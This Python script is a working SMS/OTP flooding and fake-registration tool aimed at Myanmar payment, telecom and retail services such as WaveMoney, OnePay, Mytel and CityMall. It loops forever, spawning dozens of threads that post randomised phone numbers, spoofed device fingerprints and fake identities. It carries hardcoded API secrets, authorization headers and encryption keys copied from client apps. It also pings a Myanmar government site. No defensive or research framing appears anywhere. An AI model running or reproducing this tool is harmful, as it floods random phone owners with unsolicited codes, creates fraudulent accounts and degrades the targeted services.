import requests
import threading
import requests_cache
import random
import secrets
import string
import base64
import json
import urllib3
import time
from Crypto.Cipher import AES
from Crypto.Cipher import DES3
from Crypto.Util.Padding import pad, unpad

from datetime import datetime

urllib3.disable_warnings()
requests_cache.install_cache('my_cache', backend='memory', expire_after=3600)

def nioi():
 try:
    url = "https://mosya.gov.mm"
    yayoi={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br, zstd","DNT":"1","Connection":"keep-alive","Upgrade-Insecure-Requests":"1","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1"}
    response = requests.get(url, headers=yayoi, verify=False, timeout=(3.00, 3.00000))
    #string_value = str(response.status_code)

    # Print the HTTP status code of the response
    return response.status_code

 except requests.exceptions.RequestException as e:
    # Handle any exceptions that might occur during the request
    return 5


def kasumi(inp):
    key = bytes.fromhex("5f3f7a4fa18f8fd6fee6d5f7cffb686c") 
    iv = bytes.fromhex("31313141534421402324255e262a3333")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plain = bytes(inp, "utf-8")
    padded_plaintext = pad(plain, AES.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    payload = str(base64.b64encode(ciphertext).decode('utf-8'))
    return payload
    
def kumo(inp):
    key = bytes.fromhex("717765727421402324254153445e262a7177657274214023") 
    iv = bytes.fromhex("4142434445464748")
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    plain = bytes(inp, "utf-8")
    padded_plaintext = pad(plain, DES3.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    payload = str(base64.b64encode(ciphertext).decode('utf-8'))
    return payload    


def tgen():
    return str((datetime.now() - datetime(1970, 1, 1)).total_seconds()).replace('.','')[:13]

def grhs(length):
    return secrets.token_hex(length // 2 if length % 2 == 0 else (length // 2) + 1)[:length]

def dtype(nu):
    if nu == 'l':
     return random.choice(['Samsung','Oppo','Vivo','Huawei','Google','Realme','Samsung','Oppo','Vivo','Huawei','Google','Realme'])
    else:
     return random.choice(['samsung','oppo','vivo','huawei','google','realme','Samsung','Oppo','Vivo','Huawei','Google','Realme'])

def dname():
    return random.choice(['SM-'+gas(4),'CPH'+str(random.randint(2000,2999)),'CHP'+str(random.randint(2000,2999)),'A'+str(random.randint(50,99)),'RMX'+str(random.randint(2000,3000)),'YAL-L41','YAL-AL00','HRY-LX1T','RVL-AL102','BKL-AL20','JSN-L11','COL-L29','HRY-AL00','STK-LX1','STF-AL00','LLD-AL00','DUK-AL20','JSN-AL00','KSE-LX9','JAT-LX1','FRD-L19','BND-AL10','DUA-TL00','LND-AL30','PLK-L01','H60-L02','KII-L21','TIT-L01','CHM-U01','SCL-L04','RVL-AL09','MXW-AN00','MOA-LX9N','DNN-LX9','AKA-L29','TFY-LX2','TFY-LX3','NTN-L22','NTN-AN20','JSN-L21','ANY-LX1','ANY-AN00','ANY-NX1','RBN-NX1','FNE-AN00','FNE-NX9','CRT-NX1','VNA-LX2','VNE-LX1','VNE-LX2','VNE-LX3','VNA-LX2','NTH-AL00','RMO-NX3','RMO-NX1','CRT-LX1','CMA-LX2','RKY-LX1','CLK-LX1','JDY-LX1','WDY-LX1','WOD-LX1','WOD-LX2','ALI-NX1','ALI-AN00','LGE-NX9','ALI-NX3','REA-AN00','RNA-AN00','LLY-LX1','LLY-NX1','ELI-AN00','ALT-NX1','CLK-NX1','BRP-NX1','PGT-AN10','BRP-NX1','SDY-AN00','HPB-AN00','ALT-LX2','DUB-LX1','LDN-L01','MED-LX9','MRD-LX1F','AMN-LX9','JAT-LX3','MED-LX9','ART-L28','STK-L21','AQM-LX1','LYA-L09','HMA-L29','HMA-L09','SNE-LX1','SNE-AL00','BLA-L29','ALP-L29','RNE-L01','CRNE-L21','MYA-L11','TRT-LX1','DIG-L01','CAN-L01','YAL-L61','NEN-L22','NAM-LX9','NAM-AL00','STG-LX1','CTR-LX2','CTR-L81','MGA-LX9N','MGA-LX3','EVE-LX9','JLN-LX1','BNE-LX1','BON-AL00','BNE-LX1','NCO-LX1','NCO-AL00','GLA-LX1','GOA-LX9','RTE-AL00','JNY-L21A','VOG-L29','ELE-L29','ELE-L09','MAR-LX1A','CLT-L09','EML-L29C','EML-L09C','ANE-LX1','STK-LX1','POT-LX1T','INE-LX1','POT-L21','POT-LX1','FIG-L31','VKY-L09','VKY-L29','VTR-L29','VTR-L09','WAS-LX1','VIE-L09','EVA-L09','VNS-L31','PRA-TL10','ALE-L21','ART-L29','PPA-L22B','STK-L21','PPA-L22B','GLK-L21','ANA-AN00','AQM-LX1','MNA-LX9','JAD-AL50'])
    
def sakura(url, headers, b, boo='x'):
    if b == "a":
     try:
      requests.post(url=url, headers=headers, data=boo, verify=False, timeout=(0.42, 0.00001))
     except Exception as e:
      pass 
    elif b == "x" :
     try:
      requests.request(method='GET', url=url, headers=headers, data=boo, verify=False, timeout=(0.42, 0.00001))
     except Exception as e:
      pass 
    else:
     try:     
      requests.get(url=url, headers=headers, verify=False, timeout=(0.42, 0.00001))
     except Exception as e:
      pass 

def gas(length):
    alphanumeric_characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(alphanumeric_characters) for _ in range(length))

def gas2(length):
    alphanumeric_characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join(random.choice(alphanumeric_characters) for _ in range(length))

def gas3(length):
    alphanumeric_characters = string.ascii_uppercase + string.ascii_lowercase
    return ''.join(random.choice(alphanumeric_characters) for _ in range(length))

def gas4(length):
    alphanumeric_characters = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
    return ''.join(random.choice(alphanumeric_characters) for _ in range(length))

def msidg(init):
    return init + str(random.randint(10000000,99999999))

def gas0(length):
    alphanumeric_characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(alphanumeric_characters) for _ in range(length))

def hanazakari():
    b = "a"
    fak = gas(12)
    url = 'https://api.citymall.com.mm/citymallcommercewebservices/v2/citymall/register?lang=en'
    headers = {"user-agent":"Dart/3.6 (dart:io)","Connection":"keep-alive","accept":"*/*","cache-control":"no-cache, no-store, max-age=0, must-revalidate","Accept-Encoding":"gzip, deflate, br","channel":"ANDROID","Content-Length":"162","content-type":"application/json; charset=UTF-8","api-secret-key":"UTaYovTa0wiRr2Uv5mDb"}
    payload = {"titleCode":"mr","firstName":gas3(random.randint(3, 6)),"lastName":gas3(random.randint(3, 6)),"email":gas0(random.randint(5, 12))+"@gmail.com","password":fak,"mobileNumber":msidg('96'),"mobileCountryCode":"+95"}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"titleCode":"ms","firstName":gas3(random.randint(3, 6)),"lastName":gas3(random.randint(3, 6)),"email":gas0(random.randint(5, 12))+"@gmail.com","password":fak,"mobileNumber":msidg('95'),"mobileCountryCode":"+95"}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"titleCode":"ms","firstName":gas3(random.randint(3, 6))+' '+gas3(random.randint(3, 6)),"lastName":gas3(random.randint(3, 6)),"email":gas0(random.randint(5, 12))+"@gmail.com","password":fak,"mobileNumber":msidg('97'),"mobileCountryCode":"+95"}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    url = 'https://onepay.mobi/API/Wallet/Wallet_SendLoginOTPV2'
    headers = {"Accept":"application/json","Content-Type":"application/json","Content-Length":"130","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.2","Connection":"keep-alive"}
    ustringer = grhs(16) + random.choice(['11Mo', '11Tu', '11We', '11Th', '11Fr', '11Su', '11Sa']) +"2025"+str(random.randint(10,24))+str(random.randint(10,59))+str(random.randint(100000,900000))
    payload = {"MobileNo":kumo(msidg('9596')),"UserType":"wJcVk3q9PLQ=","UID":kumo(ustringer)}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    ustringer = grhs(16) + random.choice(['11Mo', '11Tu', '11We', '11Th', '11Fr', '11Su', '11Sa']) +"2025"+str(random.randint(10,24))+str(random.randint(10,59))+str(random.randint(100000,900000))
    payload = {"MobileNo":kumo(msidg('9595')),"UserType":"wJcVk3q9PLQ=","UID":kumo(ustringer)}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    ustringer = grhs(16) + random.choice(['11Mo', '11Tu', '11We', '11Th', '11Fr', '11Su', '11Sa']) +"2025"+str(random.randint(10,24))+str(random.randint(10,59))+str(random.randint(100000,900000))
    payload = {"MobileNo":kumo(msidg('9597')),"UserType":"wJcVk3q9PLQ=","UID":kumo(ustringer)}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    url = 'https://api.ayainnovation.com/api/user/getDefaultSMS'
    headers = {"Accept":"application/json","Version":"3.3.8","Accept-Language":"en","Authorization":"Basic hQCOKs75uoYxakySqIA7qrjzdj2Z9PYn","Content-Type":"application/json","Content-Length":"23","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.2"}
    payload = {"phone":msidg('096')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"phone":msidg('095')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"phone":msidg('097')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    url = 'https://api.wavemoney.io:8100/v3/wmt-mfs-otp/register-customer'
    headers = {"Fingerprint":gas(64),"Device":gas2(random.randint(10,20)),"Cpuabi":"arm64-v8a,armeabi-v7a,armeabi","Manufacturer":dname(),"Model":dname(),"Product":gas0(5),"Osversion":str(random.randint(10,14)),"Appid":"mm.com.wavemoney.wavepay","Appversion":"2.4.1","Versioncode":"1465","Deviceid":grhs(40),"Userlanguage":"en","Content-Type":"application/x-www-form-urlencoded","Content-Length":"35","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.0","Connection":"keep-alive"}
    payload = 'msisdn='+msidg('96')+'&countryCode=%2B95'
    sakura(url, headers, b, payload)
    headers = {"Fingerprint":gas(64),"Device":gas2(random.randint(8,14))+gas2(random.randint(8,14)),"Cpuabi":"arm64-v8a,armeabi-v7a,armeabi","Manufacturer":dname(),"Model":dname(),"Product":gas0(5),"Osversion":str(random.randint(10,14)),"Appid":"mm.com.wavemoney.wavepay","Appversion":"2.4.1","Versioncode":"1465","Deviceid":grhs(40),"Userlanguage":"en","Content-Type":"application/x-www-form-urlencoded","Content-Length":"35","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.0","Connection":"keep-alive"}
    payload = 'msisdn='+msidg('95')+'&countryCode=%2B95'
    sakura(url, headers, b, payload)
    headers = {"Fingerprint":gas(64),"Device":dname(),"Cpuabi":"arm64-v8a,armeabi-v7a,armeabi","Manufacturer":dname(),"Model":dname(),"Product":gas0(5),"Osversion":str(random.randint(10,14)),"Appid":"mm.com.wavemoney.wavepay","Appversion":"2.4.1","Versioncode":"1465","Deviceid":grhs(40),"Userlanguage":"en","Content-Type":"application/x-www-form-urlencoded","Content-Length":"35","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.0","Connection":"keep-alive"}
    payload = 'msisdn='+msidg('97')+'&countryCode=%2B95'
    sakura(url, headers, b, payload)
    url = 'https://apis.mytel.com.mm/myid/authen/v1.0/v2/register/request'
    headers = {"Accept-Language":"en","Content-Type":"application/json; charset=UTF-8","Content-Length":"23","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.1"}
    payload = {"msisdn":msidg('96')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"msisdn":msidg('95')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"msisdn":msidg('97')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    url = 'https://api.aungbarlay.com.mm/user/customer/register'
    headers = {"User-Agent":"Dart/3.4 (dart:io)","Lang":"my","Accept-Language":"my","Accept-Encoding":"gzip, deflate, br","Content-Length":"30","Authorization":"Bearer","Content-Type":"application/json"}
    payload = {"phoneNumber":msidg('9596')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"phoneNumber":msidg('9595')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    payload = {"phoneNumber":msidg('9597')}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    url = 'https://mytelpay.mytel.com.mm:8000/mobile-device/mobile/device/v1.0/verify'
    did = grhs(16)
    headers = {"User-Agent":"okhttp/3.12.1","Accept-Encoding":"gzip, deflate, br","Connection":"Keep-Alive","Content-Length":"286","Content-Type":"application/json","Accept-Language":"en"}
    payload = {"deviceId":did,"os":"android","version":str(random.randint(11,14)),"mac":did,"manufacturer":dtype('l'),"model":dname(),"ime":None,"clientVersion":"EU_4.12.0","msisdn":msidg('096'),"requestId":grhs(37),"currentTime":tgen(),"role":"EU"}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    did = grhs(16)
    payload = {"deviceId":did,"os":"android","version":str(random.randint(11,14)),"mac":did,"manufacturer":dtype('l'),"model":dname(),"ime":None,"clientVersion":"EU_4.12.0","msisdn":msidg('095'),"requestId":grhs(37),"currentTime":tgen(),"role":"EU"}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    did = grhs(16)
    payload = {"deviceId":did,"os":"android","version":str(random.randint(11,14)),"mac":did,"manufacturer":dtype('l'),"model":dname(),"ime":None,"clientVersion":"EU_4.12.0","msisdn":msidg('097'),"requestId":grhs(37),"currentTime":tgen(),"role":"EU"}
    boo = json.dumps(payload)
    sakura(url, headers, b, boo)
    msid1 = msidg('096')
    msid2 = msidg('095')
    msid3 = msidg('097')
    url = 'https://ocsmm-prod-api.siammakro.co.th/next-ocs-member/user/register/mobile/requestOTP'
    boun = grhs(8) + '-' + grhs(4) + '-' + grhs(4) + '-' + grhs(4) + '-' + grhs(12)
    headers = {"Accept":"application/json, text/plain, */*","Content-Type":'multipart/form-data; boundary='+boun,"Content-Length":"165","Accept-Encoding":"gzip, deflate, br","User-Agent":"okhttp/4.9.2"}
    boo = f"""--{boun}\r
content-disposition: form-data; name="phoneNo"\r
Content-Length: 12\r
\r
{msid1}\r
--{boun}--\r
"""
    sakura(url, headers, b, boo)
    boo = f"""--{boun}\r
content-disposition: form-data; name="phoneNo"\r
Content-Length: 12\r
\r
{msid2}\r
--{boun}--\r
"""
    sakura(url, headers, b, boo)
    boo = f"""--{boun}\r
content-disposition: form-data; name="phoneNo"\r
Content-Length: 12\r
\r
{msid3}\r
--{boun}--\r
"""
    sakura(url, headers, b, boo)

def izaya():
    r = 1
    while r > 0:
         threading.Thread(target=hanazakari).start()
         time.sleep(2.45)
         threading.Thread(target=hanazakari).start()
         time.sleep(2.45)
         threading.Thread(target=hanazakari).start()
         time.sleep(2.45)
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         threading.Thread(target=hanazakari).start()
         hanazakari()

izaya()
